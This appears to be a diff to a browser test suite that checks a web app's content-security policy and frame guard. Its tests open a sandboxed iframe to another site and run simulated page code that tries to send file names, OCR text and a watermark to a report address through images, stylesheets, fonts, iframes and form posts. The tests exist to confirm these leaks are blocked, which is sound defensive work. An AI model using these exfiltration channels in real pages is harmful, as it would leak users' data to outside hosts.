@@ -159,15 +159,16 @@ test('the page cannot open a frame to another site, not even the old counter pag
   const traffic = await asPublicSite(context)
   await page.goto(ROOT)
   await expect(page.locator('h1')).toBeVisible()
-  const blocked = await page.evaluate(async (src) => {
-    const violation = new Promise<string>((resolve) => { document.addEventListener('securitypolicyviolation', (e) => { resolve(e.effectiveDirective) }, { once: true }) })
+  const refused = await page.evaluate((src) => {
     const f = document.createElement('iframe')
     f.setAttribute('sandbox', 'allow-scripts')
     f.src = src
-    document.body.append(f)
-    return await violation
+    // The frame guard refuses the element before it enters the page (ADR 0034); if it ever let one
+    // through, frame-src (default-src 'none') would still refuse the address.
+    try { document.body.append(f); return 'added' } catch (e) { return (e as Error).name }
   }, OLD_COUNTER)
-  expect(blocked).toBe('frame-src')
+  expect(refused).toBe('NotSupportedError')
+  await expect(page.locator('iframe')).toHaveCount(0)
   await page.waitForTimeout(2000)
   // The frame's page was never requested, so the script inside it never ran or reported.
   expect(left(traffic)).toEqual([])
@@ -236,7 +237,7 @@ test('page code that gathers file names, OCR text and the watermark cannot send 
     const img = new Image(); img.src = `${report}?i=${q}`
     const link = document.createElement('link'); link.rel = 'stylesheet'; link.href = `${report}?s=${q}`; document.head.append(link)
     await new FontFace('x', `url(${report}?f=${q})`).load().catch(() => {})
-    const frame = document.createElement('iframe'); frame.src = `${report}?d=${q}`; document.body.append(frame)
+    const frame = document.createElement('iframe'); frame.src = `${report}?d=${q}`; try { document.body.append(frame) } catch {} // refused (ADR 0034)
     const form = document.createElement('form'); form.method = 'post'; form.action = report; form.target = 'x'
     const field = document.createElement('input'); field.name = 'd'; field.value = text; form.append(field); document.body.append(form)
     try { form.submit() } catch {}
